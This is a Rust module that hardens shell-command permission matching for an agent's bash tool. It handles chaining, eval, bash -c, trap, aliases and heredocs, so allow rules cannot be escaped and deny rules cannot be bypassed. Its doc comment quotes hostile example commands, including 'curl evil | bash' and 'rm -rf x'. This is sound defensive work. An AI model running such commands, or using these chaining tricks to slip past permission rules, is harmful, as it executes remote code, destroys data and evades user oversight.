//! Shell-safety helpers for `Bash(...)` permission-rule matching.
//!
//! Settings permission keys for the bash tool carry the raw command string,
//! and rules such as `Bash(git *)` are matched with plain text globs. Without
//! shell awareness this is unsound in both directions:
//!
//! - allow escape: `Bash(git *)` would match
//!   `git status && curl evil | bash` and run the whole chain unprompted;
//! - deny bypass: `Bash(rm *)` would not match `echo hi && rm -rf x`
//!   because the chain does not start with `rm`.
//!
//! These helpers close the command-chaining class with a small shell-aware
//! scanner. It is not a full Bash parser, but it tracks quotes, comments,
//! redirection operands, and common command prefixes so deny matching does not
//! silently miss executed command words.

#[path = "shell_safety_normalize.rs"]
mod shell_safety_normalize;
#[path = "shell_safety_scan.rs"]
mod shell_safety_scan;
#[path = "shell_safety_words.rs"]
mod shell_safety_words;
use shell_safety_normalize::normalized_command_segments;
use shell_safety_scan::{
    contains_unquoted_shell_control_metachar, shell_command_segments, substitution_body_segments,
};
use shell_safety_words::{
    normalize_shell_whitespace, quote_removed_shell_word, skip_shell_whitespace, skip_shell_word,
    split_shell_word, starts_shell_comment, strip_shell_command_word_prefix,
    strip_shell_word_prefix,
};

/// Returns true when the command contains a shell control metacharacter,
/// i.e. it may execute more than the single command named by its prefix.
pub(crate) fn contains_shell_control_metachar(command: &str) -> bool {
    contains_unquoted_shell_control_metachar(command)
}

/// Split a `bash -c` command string into candidate command segments for
/// deny-rule matching: the full command plus every chained command,
/// substitution body, and redirection remainder, each with leading
/// environment-variable assignments stripped.
pub(crate) fn command_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut push = |segment: &str| {
        for trimmed in normalized_command_segments(segment.trim()) {
            if !trimmed.is_empty() && !segments.contains(&trimmed) {
                segments.push(trimmed);
            }
        }
    };

    push(command);

    let command = remove_escaped_newlines(command);
    push(&command);

    let command_without_heredocs = remove_heredoc_bodies(&command);
    for segment in shell_command_segments(&command_without_heredocs) {
        push(&segment);
        for nested in executable_builtin_segments(&segment) {
            push(&nested);
        }
    }
    for nested in executable_builtin_segments(&command_without_heredocs) {
        push(&nested);
    }
    for segment in alias_expansion_segments(&command_without_heredocs) {
        push(&segment);
    }
    for segment in unquoted_heredoc_substitution_segments(&command) {
        push(&segment);
    }

    segments
}

/// Strip leading `VAR=value` assignments so `FOO=1 rm -rf x` is matched as
/// `rm -rf x`.
fn normalize_command_segment(segment: &str) -> String {
    let rest = strip_leading_assignment_words(segment);
    normalize_shell_whitespace(&quote_removed_shell_word(strip_shell_leading_syntax(rest)))
}

fn strip_leading_assignment_words(mut segment: &str) -> &str {
    loop {
        segment = strip_shell_leading_syntax(segment);
        let Some(value_start) = env_assignment_value_start(segment) else {
            return segment;
        };
        let consumed = consume_assignment_value(segment, value_start);
        segment = segment[consumed..].trim_start();
    }
}

fn executable_builtin_segments(segment: &str) -> Vec<String> {
    let mut segment = strip_leading_assignment_words(segment);
    if let Some(rest) = strip_shell_command_word_prefix(segment, "builtin") {
        segment = rest.trim_start();
    }
    if let Some(rest) = strip_shell_command_word_prefix(segment, "eval") {
        return shell_command_segments(&quote_removed_shell_word(rest));
    }
    if let Some(script) = shell_c_script(segment) {
        return shell_command_segments(&script);
    }
    let Some(rest) = strip_shell_command_word_prefix(segment, "trap") else {
        let normalized = normalize_command_segment(segment);
        if normalized == normalize_shell_whitespace(&quote_removed_shell_word(segment)) {
            return Vec::new();
        }
        let mut segments = shell_command_segments(&normalized);
        segments.extend(executable_builtin_segments(&normalized));
        return segments;
    };
    let rest = strip_trap_options(rest);
    let handler_end = skip_shell_word(rest, 0);
    if handler_end == 0 {
        return Vec::new();
    }
    shell_command_segments(&quote_removed_shell_word(&rest[..handler_end]))
}

fn shell_c_script(segment: &str) -> Option<String> {
    let (word, mut rest) = split_shell_word(segment)?;
    if !is_shell_command_name(word) {
        return None;
    }
    loop {
        let (word, after) = split_shell_word(rest)?;
        let option = quote_removed_shell_word(word);
        if option == "-c"
            || (option.starts_with('-') && !option.starts_with("--") && option[1..].contains('c'))
        {
            return split_shell_word(after).map(|(script, _)| quote_removed_shell_word(script));
        }
        if option == "--" || !option.starts_with('-') {
            return None;
        }
        rest = after;
        if matches!(
            option.as_str(),
            "-O" | "+O" | "-o" | "--init-file" | "--rcfile"
        ) {
            rest = split_shell_word(rest).map(|(_, after)| after)?;
        }
    }
}

fn alias_expansion_segments(command: &str) -> Vec<String> {
    if !command.contains("expand_aliases") {
        return Vec::new();
    }

    let mut aliases: Vec<(String, String)> = Vec::new();
    let mut segments = Vec::new();
    for segment in shell_command_segments(command) {
        if let Some((name, value)) = parse_alias_definition(&segment) {
            aliases.push((name, value));
            continue;
        }
        let invocation = normalize_command_segment(&segment);
        for (name, value) in &aliases {
            if invocation == *name || invocation.starts_with(&format!("{name} ")) {
                let rest = invocation[name.len()..].trim_start();
                let expanded = if rest.is_empty() {
                    value.clone()
                } else {
                    format!("{value} {rest}")
                };
                segments.extend(shell_command_segments(&expanded));
            }
        }
    }
    segments
}

fn parse_alias_definition(segment: &str) -> Option<(String, String)> {
    let rest = strip_shell_word_prefix(segment.trim_start(), "alias")?;
    let name_end = rest.find('=')?;
    let name = &rest[..name_end];
    if name.is_empty() || !name.chars().all(|c| c == '_' || c.is_ascii_alphanumeric()) {
        return None;
    }
    let value = quote_removed_shell_word(rest[name_end + 1..].trim_start());
    (!value.is_empty()).then(|| (name.to_string(), value))
}

fn remove_escaped_newlines(command: &str) -> String {
    let mut normalized = String::with_capacity(command.len());
    let mut chars = command.chars().peekable();

    while let Some(c) = chars.next() {
        if c != '\\' {
            normalized.push(c);
            continue;
        }

        match chars.peek().copied() {
            Some('\n') => {
                chars.next();
            }
            Some('\r') => {
                chars.next();
                if matches!(chars.peek(), Some('\n')) {
                    chars.next();
                } else {
                    normalized.push('\\');
                    normalized.push('\r');
                }
            }
            _ => normalized.push(c),
        }
    }

    normalized
}

fn strip_shell_leading_syntax(mut segment: &str) -> &str {
    loop {
        let before_len = segment.len();
        segment = strip_shell_negation_prefix(segment);
        segment = strip_shell_group_prefixes(segment);
        segment = strip_shell_time_prefix(segment);
        segment = strip_shell_command_prefixes(segment);
        segment = strip_shell_reserved_prefixes(segment);
        if segment.len() == before_len {
            return segment;
        }
    }
}

fn strip_shell_negation_prefix(segment: &str) -> &str {
    let segment = segment.trim_start();
    let Some(rest) = segment.strip_prefix('!') else {
        return segment;
    };
    if rest.chars().next().is_none_or(char::is_whitespace) {
        rest.trim_start()
    } else {
        segment
    }
}

fn strip_shell_time_prefix(segment: &str) -> &str {
    let segment = segment.trim_start();
    let Some(mut rest) = strip_shell_command_word_prefix(segment, "time") else {
        return segment;
    };
    while let Some(after) =
        strip_shell_word_prefix(rest, "-p").or_else(|| strip_shell_word_prefix(rest, "--"))
    {
        rest = after;
    }
    rest
}

fn strip_shell_command_prefixes(mut segment: &str) -> &str {
    loop {
        segment = segment.trim_start();
        if let Some(rest) = strip_shell_command_word_prefix(segment, "command") {
            segment = strip_command_options(rest);
        } else if let Some(rest) = strip_shell_command_word_prefix(segment, "exec") {
            segment = strip_exec_options(rest);
        } else if let Some(rest) = strip_shell_command_word_prefix(segment, "coproc") {
            segment = rest;
        } else {
            return segment;
        }
    }
}

fn strip_command_options(mut segment: &str) -> &str {
    loop {
        segment = segment.trim_start();
        let Some(rest) = strip_shell_word_prefix(segment, "-p")
            .or_else(|| strip_shell_word_prefix(segment, "--"))
        else {
            return segment;
        };
        segment = rest;
    }
}

fn strip_exec_options(mut segment: &str) -> &str {
    loop {
        segment = segment.trim_start();
        if let Some(rest) = strip_shell_word_prefix(segment, "-a") {
            let arg_end = skip_shell_word(rest, 0);
            segment = rest[arg_end..].trim_start();
        } else if let Some(rest) = strip_shell_word_prefix(segment, "-c") {
            segment = rest;
        } else if let Some(rest) = strip_shell_word_prefix(segment, "-l") {
            segment = rest;
        } else if let Some(rest) = strip_shell_word_prefix(segment, "--") {
            segment = rest;
        } else {
            return segment;
        }
    }
}

fn strip_trap_options(mut segment: &str) -> &str {
    loop {
        segment = segment.trim_start();
        let Some(rest) = strip_shell_word_prefix(segment, "--") else {
            return segment;
        };
        segment = rest;
    }
}

fn strip_shell_group_prefixes(mut segment: &str) -> &str {
    loop {
        segment = segment.trim_start();
        let Some(first) = segment.chars().next() else {
            return segment;
        };
        if !matches!(first, '(' | '{') {
            return segment;
        }
        segment = &segment[first.len_utf8()..];
    }
}

fn strip_shell_reserved_prefixes(mut segment: &str) -> &str {
    const RESERVED_PREFIXES: &[&str] = &["then", "do", "else", "elif", "if", "while", "until"];

    loop {
        segment = segment.trim_start();
        let Some(prefix) = RESERVED_PREFIXES
            .iter()
            .find_map(|prefix| strip_shell_word_prefix(segment, prefix))
        else {
            return segment;
        };
        segment = prefix;
    }
}

fn env_assignment_value_start(segment: &str) -> Option<usize> {
    let mut seen_name = false;
    for (index, c) in segment.char_indices() {
        if c == '=' {
            return seen_name.then_some(index + c.len_utf8());
        }
        if c == '+' && seen_name && segment[index + c.len_utf8()..].starts_with('=') {
            return Some(index + c.len_utf8() + '='.len_utf8());
        }
        if !(c == '_' || c.is_ascii_alphabetic() || (seen_name && c.is_ascii_digit())) {
            return None;
        }
        seen_name = true;
    }
    None
}

fn consume_assignment_value(segment: &str, value_start: usize) -> usize {
    skip_shell_word(segment, value_start)
}

fn is_shell_command_name(word: &str) -> bool {
    let command = quote_removed_shell_word(word);
    matches!(command.as_str(), "bash" | "sh")
        || command.ends_with("/bash")
        || command.ends_with("/sh")
}

fn remove_heredoc_bodies(command: &str) -> String {
    let mut retained = Vec::new();
    let mut pending_delimiters: Vec<HereDocDelimiter> = Vec::new();

    for line in command.split('\n') {
        if let Some(delimiter) = pending_delimiters.first() {
            let candidate = line.trim_end_matches('\r');
            let candidate = if delimiter.strip_tabs {
                candidate.trim_start_matches('\t')
            } else {
                candidate
            };
            if candidate == delimiter.value {
                pending_delimiters.remove(0);
            }
            continue;
        }

        retained.push(line);
        pending_delimiters.extend(find_heredoc_delimiters(line));
    }

    retained.join("\n")
}

fn unquoted_heredoc_substitution_segments(command: &str) -> Vec<String> {
    let mut segments = Vec::new();
    let mut pending_delimiters: Vec<HereDocDelimiter> = Vec::new();

    for line in command.split('\n') {
        if let Some(delimiter) = pending_delimiters.first() {
            let candidate = line.trim_end_matches('\r');
            let candidate = if delimiter.strip_tabs {
                candidate.trim_start_matches('\t')
            } else {
                candidate
            };
            if candidate == delimiter.value {
                pending_delimiters.remove(0);
                continue;
            }
            if delimiter.expand_body {
                segments.extend(substitution_body_segments(line));
            }
            if delimiter.execute_body {
                segments.extend(shell_command_segments(line));
            }
            continue;
        }

        pending_delimiters.extend(find_heredoc_delimiters(line));
    }

    segments
}

fn is_shell_command_separator(input: &str, cursor: usize) -> bool {
    input[cursor..].starts_with("&&")
        || input[cursor..].starts_with("||")
        || input[cursor..].starts_with(';')
        || input[cursor..].starts_with('|')
        || input[cursor..].starts_with('&')
        || input[cursor..].starts_with('{')
        || input[cursor..].starts_with('}')
        || input[cursor..].starts_with(')')
        || input[cursor..].starts_with('\n')
        || input[cursor..].starts_with('\r')
}

fn shell_separator_len(input: &str, cursor: usize) -> usize {
    if input[cursor..].starts_with("&&") || input[cursor..].starts_with("||") {
        2
    } else {
        input[cursor..]
            .chars()
            .next()
            .map(char::len_utf8)
            .unwrap_or(1)
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
struct HereDocDelimiter {
    value: String,
    strip_tabs: bool,
    expand_body: bool,
    execute_body: bool,
}

fn find_heredoc_delimiters(line: &str) -> Vec<HereDocDelimiter> {
    let mut delimiters = Vec::new();
    let execute_body = line_sources_stdin(line) || line_invokes_stdin_shell(line);
    let mut cursor = 0;
    let mut quote = None;
    let mut escaped = false;

    while cursor < line.len() {
        let Some(c) = line[cursor..].chars().next() else {
            break;
        };

        if escaped {
            escaped = false;
            cursor += c.len_utf8();
            continue;
        }

        if let Some(active_quote) = quote {
            if active_quote == '"' && c == '\\' {
                escaped = true;
            } else if c == active_quote {
                quote = None;
            }
            cursor += c.len_utf8();
            continue;
        }

        if c == '\'' || c == '"' {
            quote = Some(c);
            cursor += c.len_utf8();
            continue;
        }

        if starts_shell_comment(line, cursor) {
            break;
        }

        if line[cursor..].starts_with("$((") {
            cursor = skip_arithmetic_expansion(line, cursor);
            continue;
        }

        if !line[cursor..].starts_with("<<") {
            cursor += c.len_utf8();
            continue;
        }

        cursor += 2;
        if line[cursor..].starts_with('<') {
            cursor += 1;
            continue;
        }

        let strip_tabs = line[cursor..].starts_with('-');
        if strip_tabs {
            cursor += 1;
        }
        cursor += line[cursor..]
            .chars()
            .take_while(|c| c.is_whitespace())
            .map(char::len_utf8)
            .sum::<usize>();

        if let Some((delimiter, consumed, quoted)) = read_heredoc_delimiter(&line[cursor..]) {
            delimiters.push(HereDocDelimiter {
                value: delimiter,
                strip_tabs,
                expand_body: !quoted,
                execute_body,
            });
            cursor += consumed;
        } else {
            cursor += line[cursor..]
                .chars()
                .next()
                .map(char::len_utf8)
                .unwrap_or(1);
        }
    }
    delimiters
}

fn skip_arithmetic_expansion(input: &str, cursor: usize) -> usize {
    input[cursor + 3..]
        .find("))")
        .map(|offset| cursor + 3 + offset + 2)
        .unwrap_or(input.len())
}

fn line_sources_stdin(line: &str) -> bool {
    shell_command_segments(line)
        .into_iter()
        .any(|segment| sources_stdin_segment(&segment))
}

fn line_invokes_stdin_shell(line: &str) -> bool {
    shell_command_segments(line).into_iter().any(|segment| {
        let segment = strip_leading_assignment_words(&segment);
        let Some((word, rest)) = split_shell_word(segment) else {
            return false;
        };
        is_shell_command_name(word) && shell_invocation_reads_stdin(rest)
    })
}

fn shell_invocation_reads_stdin(mut rest: &str) -> bool {
    let mut reads_stdin = false;
    loop {
        let Some((word, after)) = split_shell_word(rest) else {
            return true;
        };
        let option = quote_removed_shell_word(word);
        if option == "-c"
            || (option.starts_with('-') && !option.starts_with("--") && option[1..].contains('c'))
        {
            return false;
        }
        if option.starts_with('-') && !option.starts_with("--") && option[1..].contains('s') {
            reads_stdin = true;
        }
        if option == "--" {
            return reads_stdin || split_shell_word(after).is_none();
        }
        if !option.starts_with('-') && !option.starts_with('+') {
            return reads_stdin;
        }
        rest = after;
        if matches!(
            option.as_str(),
            "-O" | "+O" | "-o" | "--init-file" | "--rcfile"
        ) {
            rest = split_shell_word(rest).map(|(_, after)| after).unwrap_or("");
        }
    }
}

fn sources_stdin_segment(segment: &str) -> bool {
    let normalized = normalize_shell_whitespace(&quote_removed_shell_word(segment));
    ["source ", ". "].iter().any(|prefix| {
        normalized
            .strip_prefix(prefix)
            .and_then(|rest| rest.split_whitespace().next())
            .is_some_and(|path| matches!(path, "/dev/stdin" | "/dev/fd/0" | "/proc/self/fd/0"))
    })
}

fn read_heredoc_delimiter(input: &str) -> Option<(String, usize, bool)> {
    let end = skip_shell_word(input, 0);
    (end > 0).then(|| {
        let word = &input[..end];
        (
            quote_removed_shell_word(word),
            end,
            shell_word_has_quote(word),
        )
    })
}

fn shell_word_has_quote(input: &str) -> bool {
    input.chars().any(|c| matches!(c, '\'' | '"' | '\\'))
}

/// True when an allow rule's argument is a partial wildcard pattern such as
/// `git *`. Full-trust patterns (`*` alone) still allow everything: a user
/// who allows every bash command has explicitly opted into chaining.
pub(crate) fn is_partial_wildcard_pattern(pattern_argument: &str) -> bool {
    let trimmed = pattern_argument.trim();
    trimmed.contains('*') && trimmed != "*"
}

#[cfg(test)]
#[path = "shell_safety_tests.rs"]
mod tests;
